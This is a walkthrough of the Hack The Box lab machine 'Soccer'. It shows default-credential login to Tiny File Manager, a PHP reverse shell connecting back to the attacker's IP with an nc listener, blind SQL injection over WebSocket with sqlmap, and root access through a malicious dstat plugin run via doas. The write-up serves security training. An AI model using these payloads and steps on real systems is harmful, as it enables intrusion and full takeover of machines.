With the Women's World Cup in full swing, what better time to dig through the archives and run through our take on an older Hack The Box (HTB) machine "Soccer"!

Come follow along with our [YouTube stream](https://www.youtube.com/live/jujnu3JlkqA).

We start off with our usual nmap scan:

# Nmap done at Mon Jan 16 20:53:45 2023 -- 1 IP address (1 host up) scanned in 23.86 seconds
```

Lots to look at there, but we start off with port 80. In the nmap scan is a mention of a redirect to [http://soccer.htb](http://soccer.htb). Servers that use virtual hosts often require a domain name to return actual content. Edit your `/etc/hosts` file like so - replacing the IP with the IP for the server you are given (donâ€™t forget to use sudo!)

We found a web server, so while we go take a look at it, run some enumeration in the background:

```jsx

You can use `/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt` if you are using Seclists instead.

Gobuster has found a directory `/tiny`

Hitting the page we are prompted to log in to the Tiny File Manager (TFM)

![Untitled.png]({{site.baseurl}}/Images/Untitled.png)


Searchsploit and other tools donâ€™t seem to have any info or known vulnerabilities about TFM, so we go itâ€™s [Github page](https://tinyfilemanager.github.io/). (there is a link to the official github at the bottom of the login page)

No major security issues or anything have been reported in the Github issues, but looking through the documentation there are some default credentials:

```jsx
$auth_users = array(
    'admin' => '$2y$10$/K.hjNr84lLNDt8fTXjoI.DBp6PpeyoJ.mGwrrLuCZfAwfSAGqhOW', //admin@123
    'user' => '$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO', //12345
    'guest' => '$2y$10$a.DMI5sRjAnvhb.8rFAXY.XPSEO/eatVb4qCMmTc2YcxTDKp9xMyC' //guest
);
```

Lets try them all out, maybe one of them will work?

Bingo! we are in as the admin account:

![Untitled1.png]({{site.baseurl}}/Images/Untitled1.png)

So we have a php-based file manager with upload capabilities ðŸ¤” Think we know where this is goingâ€¦

Poking around trying to upload a simple `info.php` file, we find that we only have permissions to upload to the `/tiny/uploads/` directory. Files that are uploaded also appear to be deleted after a couple of minutes. 

Lets try a php reverse shell. PentestMonkey always does good things:

```jsx
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

Change the necessary lines of the php file to match our local IP and the port we want to listen on:

```jsx
$VERSION = "1.0";
$ip = '10.10.16.2';  // CHANGE THIS
$port = 81;       // CHANGE THIS
$chunk_size = 1400;
```

and set up a listener:

```jsx
nc -nlvp 81
```

All that is left to do is upload the php file and browse to it. We get a shell!

```jsx
nc -nlvp 81               
listening on [any] 81 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.194] 59696
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 04:38:51 up 40 min,  0 users,  load average: 0.00, 0.01, 0.04

uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

We Take the usual steps to upgrade the shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'` and continue poling around the file system. The `/etc/passwd` file only contains a single user:

```jsx
player:x:1001:1001::/home/player:/bin/bash
mysql:x:113:121:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:997:997::/var/log/laurel:/bin/false
```

Looks like our next steps are to try to elevate to the user `player` . We also notice that there is a `mysql` user, we didnâ€™t see it listening in the nmap scan, so it is likely that MySQL is running locally but not exposed externally.

Letâ€™s check that and see what `www-data` can see:

```jsx
netstat -tnlp

```

Port 3306 is the default MySQL port running only on 127.0.0.1 so we have confirmed our suspicion.

We spend some more time poking around the file system, but donâ€™t see anything too interesting. 

Back on our attacking machine, nmap reported that port 9091 was also a web server of some description, so we browse to it to take a look at what we are dealing with:

![Untitled2.png]({{site.baseurl}}/Images/Untitled2.png)


We know from the site on port 80 that the server is running nginx, this site doesnâ€™t auto-redirect us, but it could also be reliant on the correct vhost. We come across a useful Stack Overflow question about [how to list all nginx vhosts](https://stackoverflow.com/questions/32400933/how-can-i-list-all-vhosts-in-nginx).

```jsx
www-data@soccer:/home/player$ grep server_name /etc/nginx/sites-enabled/* -RiI
<r$ grep server_name /etc/nginx/sites-enabled/* -RiI
/etc/nginx/sites-enabled/default:       server_name 0.0.0.0;
/etc/nginx/sites-enabled/default:       server_name soccer.htb;
/etc/nginx/sites-enabled/soc-player.htb:        server_name soc-player.soccer.htb;
www-data@soccer:/home/player$cat /etc/nginx/sites-enabled/soc-player.htb
server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}
```

We can see that there is also a config file for the subdomain `soc-player.soccer.htb` so we add that to our hosts fine and see something familiar but slightly different:

![Screenshot_from_2023-01-20_16-24-51.png]({{site.baseurl}}/Images/Screenshot_from_2023-01-20_16-24-51.png)

Itâ€™s almost the same website, but there are a couple of new menu items with Match, Login and Signup.

Starting at Signup, you can sign up with any information you like, there is no account confirmation and itâ€™s that easy to create an account.

![Untitled3.png]({{site.baseurl}}/Images/Untitled3.png)

While we are manually using the website, we have Burp running in the background of course as well as `gobuster` enumerating. We captured the login and signup requests to send to `sqlmap` and `hydra` but there was nothing of use there.

After logging in, you are taken to a ticket page with a ticket number and a message telling us not to forget it! Sounds important.

![Screenshot_from_2023-01-20_16-26-26.png]({{site.baseurl}}/Images/Screenshot_from_2023-01-20_16-26-26.png)

There is an input box, which after entering random text, looks like itâ€™s trying to perform a ticket lookup.

![Untitled4.png]({{site.baseurl}}/Images/Untitled4.png)

But we donâ€™t see a POST request in our burp proxy historyâ€¦ Burp has intercepted a WebSocket request though:

![Untitled5.png]({{site.baseurl}}/Images/Untitled5.png)

Messing around with the Burpâ€™s repeater it appears to perform an â€˜is numericâ€™ check before anything else, leading the input with text always returns a not found response, but we find that it may be vulnerable to SQL Injection by sending a fairly standard PoC starting with any number:

![Untitled7.png]({{site.baseurl}}/Images/Untitled7.png)

The next logical step is to try and automate the exploitation of this finding with `SQLMap`.

`SQLMap` doesnâ€™t support WebSockets by default:

```jsx
[CRITICAL] sqlmap requires third-party module 'websocket-client' in order to use WebSocket functionality
```

We actually performed the exploit by using a python middleware script documented by [rayhan0x01](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html).

Setting up the middleware and running our saved request through SQLMap confirmed that there is a blind UNION injection vulnerability in the application:

We use SQLMap to enumerate the databases and enevtually find something interesting:

NOTE: time-based blind SQL injection can be very slow. While SQLMap supports threads to help speed things up, it has been known to mess with the results. 

Looks like we have a plain-text password. We are able to use this username and password to SSH in to the box as `player` and obtain the user flag.

Restarting our standard enumeration and checks for privesc, `sudo -l` doesnâ€™t give us much, but we are able to run `doas` as root:

```jsx
player@soccer:~$ find / -type f -name "doas.conf" 2>/dev/null
/usr/local/etc/doas.conf
player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

This will allow us to run `dstat` as the root user. Sounds like a good place to start for privesc!

```jsx
player@soccer:~$ doas -u root dstat                                                                                             
doas: Operation not permitted
player@soccer:~$ doas -u root /usr/bin/dstat
You did not select any stats, using -cdngy by default.

```

Note that similar to `sudo` you must use the full path to binary.

At the time of writing, there was nothing on GTFOBins or in the `-h` argument that suggests we can straight up exploit this into a root shell, so we do some searching and the top result for `dstat priv esc` is this article which describes creating a dstat plugin to spawn a shell:

[https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/)

So we give it a try:

```jsx
player@soccer:~$ find / -type d -name dstat 2>/dev/null
/usr/share/doc/dstat
/usr/share/dstat
/usr/local/share/dstat
```

Create `dstat_exploit.py` in `/usr/local/share/dstat`

```jsx
import os

os.system('chmod +s /usr/bin/bash')
```

It recognises the plugin:

```jsx
player@soccer:~$ doas -u root /usr/bin/dstat --list | grep exploit
        exploit
```

`dstat` returns a bunch of error messages, but the code should have run:

```jsx
player@soccer:~$ doas -u root /usr/bin/dstat --exploit
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
Module dstat_exploit failed to load. (name 'dstat_plugin' is not defined)
None of the stats you selected are available.

```

Following up with `bash -p` and we have a root shell:

```jsx
player@soccer:~$ bash -p
bash-5.0# whoami
root
```

From there we can read the `root.txt`

Bonus content:

Upon revisiting this writeup for the livestream we discovered a couple of things:

1. The SQLMap error we saw about not supporting WebSockets can easily be resolved by installing the WebSocket python module with `pip3 install websocket-client`.
This will allow you to exploit the website directly without the need for the middleware: `sqlmap -u "ws://soc-player.soccer.htb:9091" ...`
2. [GTFOBins](https://gtfobins.github.io/gtfobins/dstat/) now has a record for `dstat`. It basically runs through the exact same thing we discovered in our research, but itâ€™s nice to see that it is still updating and could now be discovered in the first place we looked.
